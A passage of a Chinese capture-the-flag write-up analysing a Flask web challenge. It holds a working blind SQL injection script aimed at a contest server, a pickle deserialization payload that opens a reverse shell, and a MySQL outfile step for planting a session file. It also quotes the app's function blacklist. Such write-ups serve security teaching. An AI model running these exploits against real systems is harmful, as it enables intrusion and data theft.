+</code></pre><p>&#x8FD9;&#x4E9B;&#x529F;&#x80FD;&#x5927;&#x90E8;&#x5206;&#x662F;&#x57FA;&#x4E8E;&#x767B;&#x9646;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x4ECE;&#x6CE8;&#x518C;&#x548C;&#x767B;&#x9646;&#x76F8;&#x5173;&#x7684;&#x4EE3;&#x7801;&#x5165;&#x624B;&#x3002;</p>
+<pre><code>@app.route(&apos;/register&apos;, methods=\[&apos;GET&apos;, &apos;POST&apos;\])
+def register():
+    if current_user.is_authenticated:
+        return redirect(url_for(&apos;index&apos;))
+    form = RegistrationForm()
+    if form.validate\_on\_submit():
+        res = mysql.Add(&quot;user&quot;, \[&quot;NULL&quot;, &quot;&apos;%s&apos;&quot; % form.username.data, &quot;&apos;%s&apos;&quot; % form.email.data,
+                                 &quot;&apos;%s&apos;&quot; % generate\_password\_hash(form.password.data), &quot;&apos;&apos;&quot;, &quot;&apos;%s&apos;&quot; % now()\])
+        if res == 1:
+            flash(&apos;Congratulations, you are now a registered user!&apos;)
+            return redirect(url_for(&apos;login&apos;))
+    return render_template(&apos;register.html&apos;, title=&apos;Register&apos;, form=form)
+</code></pre><p>&#x8DDF;&#x8FDB;<code>RegistrationForm</code>&#xFF0C;&#x5B9A;&#x4E49;&#x5728; <code>forms.py</code>&#x7684;&#x7B2C;20&#x884C;:</p>
+<pre><code>class RegistrationForm(FlaskForm):
+    username = StringField(&apos;Username&apos;, validators=\[DataRequired()\])
+    email = StringField(&apos;Email&apos;, validators=\[DataRequired(), Email()\])
+    password = PasswordField(&apos;Password&apos;, validators=\[DataRequired()\])
+    password2 = PasswordField(
+        &apos;Repeat Password&apos;, validators=\[DataRequired(), EqualTo(&apos;password&apos;)\])
+    submit = SubmitField(&apos;Register&apos;)
+
+    def validate_username(self, username):
+        if re.match(&quot;^\[a-zA-Z0-9_\]+$&quot;, username.data) == None:
+            raise ValidationError(&apos;username has invalid charactor!&apos;)
+        user = mysql.One(&quot;user&quot;, {&quot;username&quot;: &quot;&apos;%s&apos;&quot; % username.data}, \[&quot;id&quot;\])
+        if user != 0:
+            raise ValidationError(&apos;Please use a different username.&apos;)
+
+    def validate_email(self, email):
+        user = mysql.One(&quot;user&quot;, {&quot;email&quot;:  &quot;&apos;%s&apos;&quot; % email.data}, \[&quot;id&quot;\])
+        if user != 0:
+            raise ValidationError(&apos;Please use a different email address.&apos;)
+</code></pre><p>&#x5728;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x5F88;&#x660E;&#x663E;&#x7684;&#x770B;&#x5230;&#x4E24;&#x4E2A;&#x9A8C;&#x8BC1;&#x51FD;&#x6570;&#x6709;&#x5DEE;&#x522B;&#xFF0C;<code>validate_username</code>&#x5728;&#x8FDB;&#x884C;<code>mysql.One</code>&#x524D;&#x8FDB;&#x884C;&#x4E86;&#x6B63;&#x5219;&#x5339;&#x914D;&#x7684;&#x8FC7;&#x6EE4;&#x548C;&#x5BA1;&#x6838;&#xFF0C;&#x800C;<code>validate_email</code>&#x4EC5;&#x4EC5;&#x901A;&#x8FC7;<code>validators=[DataRequired(), Email()]</code>&#x6765;&#x5339;&#x914D;&#x3002;</p>
+<p><code>Email</code>&#x5B9A;&#x4E49;&#x5728;<code>wtforms.validators</code>&#x4E2D;&#xFF0C;&#x76F8;&#x5173;&#x6E90;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>
+<pre><code>class Email(Regexp):
+    &quot;&quot;&quot;
+ Validates an email address. Note that this uses a very primitive regular
+ expression and should only be used in instances where you later verify by
+ other means, such as email activation or lookups.
+ :param message:
+ Error message to raise in case of a validation error.
+ &quot;&quot;&quot;
+    def \_\_init\_\_(self, message=None):
+        self.validate_hostname = HostnameValidation(
+            require_tld=True,
+        )
+        super(Email, self).\_\_init\_\_(r&apos;^.+@(\[^.@\]\[^@\]+)$&apos;, re.IGNORECASE, message)
+    def \_\_call\_\_(self, form, field):
+        message = self.message
+        if message is None:
+            message = field.gettext(&apos;Invalid email address.&apos;)
+        match = super(Email, self).\_\_call\_\_(form, field, message)
+        if not self.validate_hostname(match.group(1)):
+            raise ValidationError(message)
+</code></pre><p>&#x5176;&#x6B63;&#x5219;&#x89C4;&#x5219;&#x4E3A;<code>^.+@([^.@][^@]+)$</code>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5BF9;email&#x800C;&#x8A00;&#xFF0C;&#x5373;&#x4F7F;&#x63D0;&#x4EA4;&#x5982;<code>&apos;&quot;#a@q.com</code>&#x5305;&#x542B;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x53CC;&#x5F15;&#x53F7;&#xFF0C;&#x6CE8;&#x91CA;&#x7B26;&#x7B49;&#x654F;&#x611F;&#x5B57;&#x7B26;&#x7684;&#x5F62;&#x5F0F;&#x4E5F;&#x662F;&#x80FD;&#x901A;&#x8FC7;&#x7684;&#x3002;</p>
+<p>&#x56DE;&#x5230;<code>validate_email</code>&#x9A8C;&#x8BC1;&#x51FD;&#x6570;&#x4E2D;&#xFF1A;</p>
+<pre><code>def validate_email(self, email):
+    user = mysql.One(&quot;user&quot;, {&quot;email&quot;:  &quot;&apos;%s&apos;&quot; % email.data}, \[&quot;id&quot;\])
+    if user != 0:
+        raise ValidationError(&apos;Please use a different email address.&apos;)
+</code></pre><p>&#x8DDF;&#x5165;<code>mysql.One</code>&#xFF0C;&#x5B9A;&#x4E49;&#x5728;others.py:</p>
+<pre><code>\# mysql.One(&quot;user&quot;, {&quot;email&quot;:  &quot;&apos;%s&apos;&quot; % email.data}, \[&quot;id&quot;\])
+def One(self, tablename, where={}, feildname=\[&quot;*&quot;\], order=&quot;&quot;, where_symbols=&quot;=&quot;, l=&quot;and&quot;):
+    \# self.Sel(&quot;user&quot;, {&quot;email&quot;:  &quot;&apos;%s&apos;&quot; % email.data}, \[&quot;id&quot;\], &quot;&quot;, &quot;=&quot;, l)
+    sql = self.Sel(tablename, where, feildname, order, where_symbols, l)
+    try:
+        res = self.db_session.execute(sql).fetchone()
+        if res == None:
+            return 0
+        return res
+    except:
+        return -1
+</code></pre><p>&#x8DDF;&#x5165;<code>self.Sel</code>:</p>
+<pre><code>\# self.Sel(&quot;user&quot;, {&quot;email&quot;:  &quot;&apos;%s&apos;&quot; % email.data}, \[&quot;id&quot;\], &quot;&quot;, &quot;=&quot;, l)
+def Sel(self, tablename, where={}, feildname=\[&quot;*&quot;\], order=&quot;&quot;, where_symbols=&quot;=&quot;, l=&quot;and&quot;):
+    sql = &quot;select &quot;
+    sql += &quot;&quot;.join(i + &quot;,&quot; for i in feildname)\[:-1\] + &quot; &quot;
+    sql += &quot;from &quot; + tablename + &quot; &quot;
+    if where != {}:
+        sql += &quot;where &quot; + &quot;&quot;.join(i + &quot; &quot; + where_symbols + &quot; &quot; +
+                                    str(where\[i\]) + &quot; &quot; + l + &quot; &quot; for i in where)\[:-4\]
+    if order != &quot;&quot;:
+        sql += &quot;order by &quot; + &quot;&quot;.join(i + &quot;,&quot; for i in order)\[:-1\]
+    return sql
+</code></pre><p>&#x6700;&#x540E;&#x62FC;&#x63A5;&#x51FA;&#x6765;&#x7684;sql&#x8BED;&#x53E5;&#x5982;&#x4E0B;&#xFF1A;</p>
+<p><code>select id from user where email = &apos;your input email&apos;</code></p>
+<p>&#x7ED3;&#x5408;&#x524D;&#x9762;&#x6240;&#x8BF4;&#x7684;&#x5BF9;&#x8F93;&#x5165;&#x90AE;&#x7BB1;email&#x5F62;&#x5F0F;&#x7684;&#x9A8C;&#x8BC1;&#xFF0C;&#x8FD9;&#x91CC;&#x5B58;&#x5728;sql&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x3002;&#x6211;&#x4EEC;&#x8BBE;&#x7F6E;&#x90AE;&#x7BB1;&#x4E3A;<code>test&apos;/**/or/**/1=1#@test.com</code>&#xFF0C;&#x5219;&#x62FC;&#x63A5;&#x540E;&#x7684;sql&#x8BED;&#x53E5;&#x4E3A;&#xFF1A;</p>
+<p><code>select id from user where email = &apos;test&apos;/**/or/**/1=1#@test.com&apos;</code></p>
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6210;&#x529F;&#x6CE8;&#x5165;&#x3002;&#x7531;&#x4E8E;&#x6B64;&#x5904;&#x4E0D;&#x80FD;&#x56DE;&#x663E;&#x6570;&#x636E;&#xFF0C;&#x56E0;&#x6B64;&#x91C7;&#x7528;&#x76F2;&#x6CE8;&#x3002;&#x56DE;&#x5230;<code>validate_username</code></p>
+<pre><code>def validate_username(self, username):
+    if re.match(&quot;^\[a-zA-Z0-9_\]+$&quot;, username.data) == None:
+        raise ValidationError(&apos;username has invalid charactor!&apos;)
+    user = mysql.One(&quot;user&quot;, {&quot;username&quot;: &quot;&apos;%s&apos;&quot; % username.data}, \[&quot;id&quot;\])
+    if user != 0:
+        raise ValidationError(&apos;Please use a different username.&apos;)
+</code></pre><p>&#x5F53;&#x67E5;&#x8BE2;&#x4E3A;&#x771F;&#x65F6;&#x4E5F;&#x5373;<code>user != 0</code>&#x4F1A;&#x51FA;&#x73B0;&#x4FE1;&#x606F;<code>Please use a different username.</code>&#xFF0C;&#x7ED3;&#x5408;&#x8FD9;&#x70B9;&#x6784;&#x9020;&#x51FA;&#x6700;&#x540E;&#x7684;exp.py&#xFF1A;</p>
+<pre><code>import requests
+from bs4 import BeautifulSoup
+
+url = &quot;http://39.107.32.29:20000/register&quot;
+
+r = requests.get(url)
+soup = BeautifulSoup(r.text,&quot;html5lib&quot;)
+token = soup.find_all(id=&apos;csrf_token&apos;)\[0\].get(&quot;value&quot;)
+
+notice = &quot;Please use a different email address.&quot;
+result = &quot;&quot;
+
+database = &quot;(SELECT/**/GROUP\_CONCAT(schema\_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)&quot;
+tables = &quot;(SELECT/**/GROUP\_CONCAT(table\_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION\_SCHEMA.TABLES/**/WHERE/**/TABLE\_SCHEMA=DATABASE())&quot;
+columns = &quot;(SELECT/**/GROUP\_CONCAT(column\_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION\_SCHEMA.COLUMNS/**/WHERE/**/TABLE\_NAME=0x666c616161616167)&quot;
+data = &quot;(SELECT/**/GROUP_CONCAT(flllllag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flaaaaag)&quot;
+
+for i in range(1,100):
+    for j in range(32,127):
+        payload = &quot;test&apos;/**/or/**/ascii(substr(&quot;+  data +&quot;,%d,1))=%d#/**/@chybeta.com&quot; % (i,j)
+        print payload
+        post_data = {
+            &apos;csrf_token&apos;: token,
+            &apos;username&apos;: &apos;a&apos;,
+            &apos;email&apos;:payload,
+            &apos;password&apos;:&apos;a&apos;,
+            &apos;password2&apos;:&apos;a&apos;,
+            &apos;submit&apos;:&apos;Register&apos;
+        }
+        r = requests.post(url,data=post_data)
+        soup = BeautifulSoup(r.text,&quot;html5lib&quot;)
+        token = soup.find_all(id=&apos;csrf_token&apos;)\[0\].get(&quot;value&quot;)
+        if notice in r.text:
+            result += chr(j)
+            print result
+            break
+</code></pre><p>&#x7531;&#x4E8E;&#x5728;&#x6CE8;&#x518C;&#x90E8;&#x5206;&#x6709;csrf_token&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x6BCF;&#x6B21;submit&#x65F6;&#x8981;&#x8BB0;&#x5F97;&#x5E26;&#x4E0A;&#xFF0C;&#x540C;&#x65F6;&#x5728;&#x6BCF;&#x6B21;&#x8FD4;&#x56DE;&#x7684;&#x9875;&#x9762;&#x4E2D;&#x53D6;&#x5F97;&#x4E0B;&#x4E00;&#x6B21;&#x7684;csrf_token&#x3002;</p>
+<p>&#x6700;&#x540E;&#x7684;flag&#xFF1A;QWB{us1ng_val1dator_caut1ous}</p>
+<h4 id="&#x89E3;&#x6CD5;&#x4E8C;"><a name="&#x89E3;&#x6CD5;&#x4E8C;" class="anchor-navigation-ex-anchor" href="#&#x89E3;&#x6CD5;&#x4E8C;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x89E3;&#x6CD5;&#x4E8C;" class="plugin-anchor" href="#&#x89E3;&#x6CD5;&#x4E8C;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x89E3;&#x6CD5;&#x4E8C;</h4>
+<p>&#x63A5;&#x7740;&#x8FDB;&#x884C;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x3002;&#x5728;<code>others.py</code>&#x7684;&#x6700;&#x540E;&#x6709;&#x8FD9;&#x6837;&#x7684;&#x5185;&#x5BB9;&#xFF1A;</p>
+<pre><code>black\_type\_list = \[eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen,
+                   tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link,
+                   lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs,
+                   rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv,
+                   execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe,
+                   spawnv, spawnve, spawnvp, spawnvpe, load, loads\]
+
+class FilterException(Exception):
+
+    def \_\_init\_\_(self, value):
+        super(FilterException, self).\_\_init\_\_(
+            &apos;the callable object {value} is not allowed&apos;.format(value=str(value)))
+
+def \_hook\_call(func):
+    def wrapper(*args, **kwargs):
+        print args\[0\].stack
+        if args\[0\].stack\[-2\] in black\_type\_list:
+            raise FilterException(args\[0\].stack\[-2\])
+        return func(*args, **kwargs)
+    return wrapper
+
+def load(file):
+    unpkler = Unpkler(file)
+    unpkler.dispatch\[REDUCE\] = \_hook\_call(unpkler.dispatch\[REDUCE\])
+    return Unpkler(file).load()
+</code></pre><p>&#x6211;&#x628A;&#x8FD9;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#x5206;&#x4E3A;&#x4E24;&#x90E8;&#x5206;&#xFF1B;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x4EE5;&#x53CA;&#x57FA;&#x672C;&#x7684;&#x6C99;&#x7BB1;&#x9003;&#x9038;&#x95EE;&#x9898;&#x3002;</p>
+<p>&#x5148;&#x5FFD;&#x7565;<code>unpkler.dispatch[REDUCE]</code>&#x8FD9;&#x4E00;&#x884C;&#x7684;&#x5185;&#x5BB9;&#x3002;</p>
+<pre><code>from pickle import Unpickler as Unpkler
+def load(file):
+    unpkler = Unpkler(file)
+    \# unpkler.dispatch\[REDUCE\] = \_hook\_call(unpkler.dispatch\[REDUCE\])
+    return Unpkler(file).load()
+</code></pre><p>&#x8FD9;&#x91CC;&#x5BF9;<code>file</code>&#x8FDB;&#x884C;&#x4E86;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x56E0;&#x6B64;&#x5982;&#x679C;<code>file</code>&#x53EF;&#x63A7;&#x5373;&#x53EF;&#x9020;&#x6210;&#x5371;&#x9669;&#x3002;</p>
+<p>&#x7528;&#x4E0B;&#x9762;&#x7684;&#x811A;&#x672C;(exp4.py)&#x8FDB;&#x884C;&#x5E8F;&#x5217;&#x5316;payload&#x7684;&#x751F;&#x6210;&#xFF1A;</p>
+<pre><code>import os
+from pickle import Pickler as Pkler
+import commands
+class chybeta(object):
+    def \_\_reduce\_\_(self):
+        return (os.system,(&quot;whoami&quot;,))    
+evil = chybeta()
+
+def dump(file):
+    pkler = Pkler(file)
+    pkler.dump(evil)
+
+with open(&quot;test&quot;,&quot;wb&quot;) as f:
+    dump(f)
+</code></pre><p>&#x6D4B;&#x8BD5;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;(exp5.py):</p>
+<pre><code>from pickle import Unpickler as Unpkler
+from io import open as Open 
+def LOAD(file):
+    unpkler = Unpkler(file)
+    return Unpkler(file).load()
+
+with Open(&quot;test&quot;,&quot;rb&quot;) as f:
+    LOAD(f)
+</code></pre><p>     <a href="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210716-71472a80-302d-1.jpeg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210716-71472a80-302d-1.jpeg" alt="">
+     </a></p>
+<p>&#x4E0D;&#x8FC7;&#x6CA1;&#x90A3;&#x4E48;&#x7B80;&#x5355;&#xFF0C;&#x6E90;&#x7801;&#x8FD8;&#x8BBE;&#x7F6E;&#x4E86;&#x6C99;&#x7BB1;/&#x9ED1;&#x540D;&#x5355;&#x6765;&#x9632;&#x6B62;&#x67D0;&#x4E9B;&#x51FD;&#x6570;&#x7684;&#x6267;&#x884C;&#xFF0C;&#x6BD4;&#x5982;&#x524D;&#x9762;&#x7684;os.system&#x5C31;&#x88AB;&#x7981;&#x7528;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x4FEE;&#x6539;exp5.py&#x4E3A;&#x8FDB;&#x4E00;&#x6B65;&#x7684;&#x6D4B;&#x8BD5;&#xFF1A;</p>
+<pre><code>from os import *
+from sys import *
+from pickle import *
+from io import open as Open 
+from pickle import Unpickler as Unpkler
+from pickle import Pickler as Pkler
+
+black\_type\_list = \[eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen,
+                   tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link,
+                   lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs,
+                   rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv,
+                   execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe,
+                   spawnv, spawnve, spawnvp, spawnvpe, load, loads\]
+
+class FilterException(Exception):
+    def \_\_init\_\_(self, value):
+        super(FilterException, self).\_\_init\_\_(
+            &apos;the callable object {value} is not allowed&apos;.format(value=str(value)))
+
+def \_hook\_call(func):
+    def wrapper(*args, **kwargs):
+        print args\[0\].stack
+        if args\[0\].stack\[-2\] in black\_type\_list:
+            raise FilterException(args\[0\].stack\[-2\])
+        return func(*args, **kwargs)
+    return wrapper
+
+def LOAD(file):
+    unpkler = Unpkler(file)
+    unpkler.dispatch\[REDUCE\] = \_hook\_call(unpkler.dispatch\[REDUCE\])
+    return Unpkler(file).load()
+
+with Open(&quot;test&quot;,&quot;rb&quot;) as f:
+    LOAD(f)
+</code></pre><p>&#x6B64;&#x65F6;&#x5982;&#x679C;&#x7B80;&#x5355;&#x5730;&#x60F3;&#x901A;&#x8FC7;&#x524D;&#x4E00;&#x6B65;&#x751F;&#x6210;&#x7684;test&#x6765;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#xFF0C;&#x4F1A;&#x62A5;&#x9519;&#x3002;</p>
+<p>     <a href="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210703-699fb630-302d-1.jpeg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210703-699fb630-302d-1.jpeg" alt="">
+     </a></p>
+<p>&#x8003;&#x8651;&#x5176;&#x4ED6;&#x65B9;&#x6CD5;&#x3002;python&#x4E2D;&#x9664;&#x4E86;os&#x548C;sys&#x6A21;&#x5757;&#x6709;&#x63D0;&#x4F9B;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x51FD;&#x6570;&#x5916;&#xFF0C;&#x8FD8;&#x6709;&#x5176;&#x4ED6;&#x7B2C;&#x4E09;&#x65B9;&#x6A21;&#x5757;&#xFF0C;&#x6BD4;&#x5982;commands&#x6A21;&#x5757;&#xFF1A;</p>
+<p>     <a href="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210611-4aa7837a-302d-1.jpeg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210611-4aa7837a-302d-1.jpeg" alt="">
+     </a></p>
+<p>&#x56E0;&#x6B64;&#x6539;&#x5199;&#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x6587;&#x4EF6;&#x7684;exp4.py&#x5982;&#x4E0B;&#xFF1A;</p>
+<pre><code>import os
+from pickle import Unpickler as Unpkler
+from pickle import Pickler as Pkler
+import commands
+class chybeta(object):
+    def \_\_reduce\_\_(self):
+        return (commands.getoutput,(&quot;python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect((\\&quot;127.0.0.1\\&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\[\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;\]);&apos;&quot;,))    
+evil = chybeta()
+
+def dump(file):
+    pkler = Pkler(file)
+    pkler.dump(evil)
+
+with open(&quot;test&quot;,&quot;wb&quot;) as f:
+    dump(f)
+</code></pre><p>&#x540C;&#x65F6;&#x4E3A;&#x4E86;&#x8FDB;&#x4E00;&#x6B65;&#x5229;&#x7528;&#xFF0C;&#x6211;&#x4EEC;&#x5C1D;&#x8BD5;&#x53CD;&#x5F39;shell&#x3002;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;&#xFF0C;&#x5148;&#x8FD0;&#x884C;exp4.py&#x751F;&#x6210;&#x65B0;&#x7684;test&#x5E8F;&#x5217;&#x5316;&#x6587;&#x4EF6;&#xFF0C;&#x63A5;&#x7740;nc&#x76D1;&#x542C;&#x672C;&#x5730;&#x7AEF;&#x53E3;&#xFF0C;&#x63A5;&#x7740;&#x8FD0;&#x884C;exp5.py&#x89E6;&#x53D1;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x5E76;&#x5B8C;&#x6210;&#x5229;&#x7528;</p>
+<p>     <a href="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210651-62471a68-302d-1.jpeg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210651-62471a68-302d-1.jpeg" alt="">
+     </a></p>
+<p>&#x4E0D;&#x8FC7;&#x8BE5;&#x600E;&#x4E48;&#x63A7;&#x5236;&#x6E90;&#x4EE3;&#x7801;&#x4E2D;&#x7684;<code>load(file)</code>&#x7684;file&#x5462;&#xFF1F;&#x901A;&#x8FC7;&#x5168;&#x5C40;&#x641C;&#x7D22;&#x5173;&#x952E;&#x5B57;&#xFF0C;&#x5728;<code>Mycache.py</code>&#x7684;<code>FileSystemCache&#x7C7B;</code>&#x4E2D;&#x6709;&#x591A;&#x6B21;&#x5F15;&#x7528;&#xFF0C;&#x6BD4;&#x5982;&#x5B9A;&#x4E49;&#x5728;&#x7B2C;137&#x884C;&#x7684;get&#x65B9;&#x6CD5;&#xFF1A;</p>
+<pre><code>def get(self, key):
+        filename = self.\_get\_filename(key)
+        try:
+            with open(filename, &apos;rb&apos;) as f:
+                pickle_time = load(f)
+                if pickle_time == 0 or pickle_time &gt;= time():
+                    a = load(f)
+                    return a
+                else:
+                    os.remove(filename)
+                    return None
+        except (IOError, OSError, PickleError):
+            return None
+</code></pre><p>&#x8DDF;&#x5165;<code>_get_filename</code>&#x65B9;&#x6CD5;&#xFF1A;</p>
+<pre><code>def \_get\_filename(self, key):
+    if isinstance(key, text_type):
+        key = key.encode(&apos;utf-8&apos;)  \# XXX unicode review
+    hash = md5(key).hexdigest()
+    return os.path.join(self._path, hash)
+</code></pre><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5C06;&#x4F20;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x4E32;key&#x8FDB;&#x884C;MD5&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x8FD4;&#x56DE;&#x3002;&#x4E0D;&#x8FC7;&#x8FD9;&#x4E2A;<code>key</code>&#x5728;&#x54EA;&#x91CC;&#x5B9A;&#x4E49;&#xFF1F;&#x901A;&#x8FC7;&#x5168;&#x5C40;&#x641C;&#x7D22;&#xFF0C;&#x4E0D;&#x96BE;&#x53D1;&#x73B0;&#x5728;<code>Mysession.py</code>&#x7684;<code>open_session</code>&#x4E2D;&#x8FDB;&#x884C;&#x4E86;&#x8C03;&#x7528;&#xFF1A;</p>
+<pre><code>class FileSystemSessionInterface(SessionInterface):
+    ...
+    def \_\_init\_\_(self, cache_dir, threshold, mode, key_prefix=&quot;bdwsessions&quot;,
+                 use_signer=False, permanent=True):
+
+        self.cache = FileSystemCache(cache_dir, threshold=threshold, mode=mode)
+        self.key_prefix = key_prefix
+        self.use_signer = use_signer
+        self.permanent = permanent
+
+    def open_session(self, app, request):
+        \# &#x4ECE;cookie&#x4E2D;&#x83B7;&#x53D6;&#x5230;sid
+        \# &#x683C;&#x5F0F; Cookie: session=675b6ec7-95bd-411f-a59d-4c3db5929604
+        \# sid &#x5373;&#x4E3A; 675b6ec7-95bd-411f-a59d-4c3db5929604
+        sid = request.cookies.get(app.session\_cookie\_name)
+        if not sid:
+            sid = self.\_generate\_sid()
+            return self.session_class(sid=sid, permanent=self.permanent)
+        ...
+        data = self.cache.get(self.key_prefix + sid)
+        if data is not None:
+            return self.session_class(data, sid=sid)
+        return self.session_class(sid=sid, permanent=self.permanent)
+    ...
+</code></pre><p>&#x5176;&#x4E2D;<code>self.key_prefix</code>&#x5373;&#x4E3A;<code>bdwsessions</code>&#xFF0C;&#x56E0;&#x6B64;&#x5047;&#x8BBE;cookie&#x4E2D;&#x7684;sesssion&#x503C;&#x4E3A;<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>&#xFF0C;&#x5219;<code>self.key_prefix + sid</code>&#x5373;&#x4E3A;<code>bdwsessions675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>&#xFF0C;&#x7136;&#x540E;&#x8FD9;&#x4E32;&#x5B57;&#x7B26;&#x4E32;&#x8FDB;&#x884C;MD5&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;<code>78f634977cbacf167dfd9656fe9dd5f3</code>&#x5373;&#x4E3A;<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>&#x5BF9;&#x5E94;&#x7684;session&#x6587;&#x4EF6;&#x540D;&#x3002;</p>
+<p>&#x540C;&#x65F6;&#x6839;&#x636E;<code>config.py</code>:</p>
+<pre><code>SQLALCHEMY\_DATABASE\_URI = &quot;mysql://root:password@localhost/flask?charset=utf8&quot;
+SESSION\_FILE\_DIR = &quot;/tmp/ffff&quot;
+</code></pre><p>&#x53EF;&#x4EE5;&#x77E5;&#x9053;session&#x6587;&#x4EF6;&#x7684;&#x4FDD;&#x5B58;&#x8DEF;&#x5F84;&#x5728;<code>/tmp/ffff</code>&#xFF0C;&#x4EE5;&#x53CA;&#x7528;&#x6237;&#x4E3A;root&#xFF0C;&#x56E0;&#x6B64;&#x5177;&#x6709;&#x6587;&#x4EF6;&#x5BFC;&#x51FA;&#x7684;&#x6743;&#x9650;&#x7684;&#x53EF;&#x80FD;&#x6027;&#x5F88;&#x5927;&#x3002;</p>
+<p>&#x6D41;&#x7A0B;</p>
+<p>&#x7ED3;&#x5408;<code>Python is the best language 1</code>&#x4E2D;&#x7684;sql&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#xFF0C;&#x6211;&#x4EEC;&#x68B3;&#x7406;&#x51FA;&#x5982;&#x4E0B;&#x7684;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#xFF1A;</p>
+<ul>
+<li><ol>
+<li>&#x672C;&#x5730;&#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4E14;&#x8FDB;&#x884C;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x7F16;&#x7801;</li>
+</ol>
+</li>
+<li><ol>
+<li>&#x901A;&#x8FC7;sql&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;outfile&#x51FA;session&#x6587;&#x4EF6;</li>
+</ol>
+</li>
+<li><ol>
+<li>&#x8BBF;&#x95EE;index&#xFF0C;&#x540C;&#x65F6;&#x5E26;&#x4E0A;session&#x6587;&#x4EF6;&#x5BF9;&#x5E94;&#x7684;session&#x503C;&#xFF0C;&#x89E6;&#x53D1;<code>open_session</code>&#x4E2D;&#x7684;<code>self.cache.get</code>&#xFF0C;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x653B;&#x51FB;</li>
+</ol>
+</li>
+</ul>
+<p>&#x5047;&#x8BBE;&#x524D;&#x9762;&#x751F;&#x6210;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x6587;&#x4EF6;&#x5B58;&#x5728;&#x4E8E;<code>/tmp/ffff/chybeta</code>&#xFF0C;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;mysql&#x7684;hex&#x8F6C;&#x7801;&#x6765;&#x8FDB;&#x884C;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x7684;&#x8F6C;&#x6362;:</p>
+<pre><code>mysql&gt; select hex(load_file(&apos;/tmp/ffff/chybeta&apos;)) into outfile &apos;/tmp/ffff/exp&apos;;
+Query OK, 1 row affected (0.00 sec)
+</code></pre><p>     <a href="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210627-54001108-302d-1.jpeg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210627-54001108-302d-1.jpeg" alt="">
+     </a></p>
